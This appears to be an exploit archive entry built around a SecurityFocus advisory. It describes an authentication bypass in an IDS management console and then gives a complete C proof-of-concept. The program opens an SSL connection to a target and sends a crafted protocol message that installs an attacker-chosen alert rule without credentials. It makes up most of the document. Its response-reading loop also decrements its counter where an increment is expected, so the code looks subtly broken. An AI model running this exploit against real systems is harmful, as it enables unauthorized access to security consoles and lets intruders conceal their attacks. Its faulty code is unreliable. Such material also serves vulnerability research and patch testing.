source: http://www.securityfocus.com/bid/9124/info
 
A vulnerability has been identified in the system that may allow an attacker to bypass authentication to add attacker supplied IDS alerts and new user accounts in the console. Successful exploitation of these issues may allow an attacker to gain unauthorized access to a vulnerable system or conceal intrusion attempts.
 
Proof of concept exploits have been made available for this issue. 

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>

#define PUT_UINT32(i, val)\
        {\
          buf[(i) ++] = ((val) >> 24) & 0xff;\
          buf[(i) ++] = ((val) >> 16) & 0xff;\
          buf[(i) ++] = ((val) >> 8) & 0xff;\
          buf[(i) ++] = (val) & 0xff;\
        }

int main(int argc, char *argv[])
{
  unsigned char *buf;
  unsigned int idx, i;
  size_t rulelen, buflen, lenidx;
  int sock;
  struct sockaddr_in sin;
  unsigned char respbuf[28];
  ssize_t n;
  SSL_CTX *sslctx;
  SSL *ssl;
  unsigned char *ruleset = "alert tcp any any -> any any (msg: \"*GOBBLE* 
*GOBBLE* *GOBBLE* *GOBBLE* \\:PpppppPPppppppPPPPPPpppp\";)";

  if (argc != 3) { fprintf(stderr, "usage: %s <host> <port>\n", argv[0]); 
exit(1); }
  rulelen = strlen(ruleset);
  buf = malloc(buflen = 12 + 4 + 4 + 4 + rulelen + 4);
  memset(buf, 0, buflen);
  idx = 0;
  PUT_UINT32(idx, 0xbabe0001); /* 0xbabe0002 for other protocol ver */
  PUT_UINT32(idx, 0x6f);
  lenidx = idx;
  PUT_UINT32(idx, 0xf00fc7c8);
  //PUT_UINT32(idx, 0); /* uncomment for other protocol ver */
  PUT_UINT32(idx, 0);
  PUT_UINT32(idx, 1);
  PUT_UINT32(idx, rulelen);
  memcpy(&buf[idx], ruleset, rulelen); idx += rulelen;
  idx |= 3; idx ++;
  PUT_UINT32(lenidx, idx);
  printf("connecting\n");
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(atoi(argv[2]));
  if ((sin.sin_addr.s_addr = inet_addr(argv[1])) == -1)
  {
    struct hostent *he;

    if ((he = gethostbyname(argv[1])) == NULL) { 
perror("gethostbyname()"); exit(1); }
    memcpy(&sin.sin_addr, he->h_addr, 4);
  }
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) { 
perror("connect()"); exit(1); }
  printf("doing ssl handshake\n");
  SSL_load_error_strings();
  SSL_library_init();
  if ((sslctx = SSL_CTX_new(SSLv23_client_method())) == NULL) { 
fprintf(stderr, "SSL_CTX_new()\n"); exit(1); }
  if ((ssl = SSL_new(sslctx)) == NULL) { fprintf(stderr, "SSL_new()\n"); 
exit(1); }
  if (SSL_set_fd(ssl, sock) != 1) { fprintf(stderr, "SSL_set_fd()\n"); 
exit(1); }
  if (SSL_connect(ssl) != 1) { fprintf(stderr, "SSL_connect()\n"); 
exit(1); }
  printf("sending %u bytes:\n", idx);
  for (i = 0; i < idx; i ++) printf("%.2x ", buf[i]);
  if (SSL_write(ssl, buf, idx) != idx) { perror("write()"); exit(1); }
  printf("\nreading:\n");
  i = 0;
  while (i < sizeof(respbuf))
  {
    if ((n = SSL_read(ssl, &respbuf[i], sizeof(respbuf) - i)) < 0) { 
perror("read()"); exit(1); }
    i -= n;
  }
  for (i = 0; i < sizeof(respbuf); i ++) printf("%.2x ", respbuf[i]);
  printf("\n");
  printf("adding nasty ruleset %s\n", (memcmp(&respbuf[16], 
"\x00\x00\x00\x00", 4) == 0)? "succeeded" : "failed");
  SSL_shutdown(ssl);
  close(sock);
  return 0;
}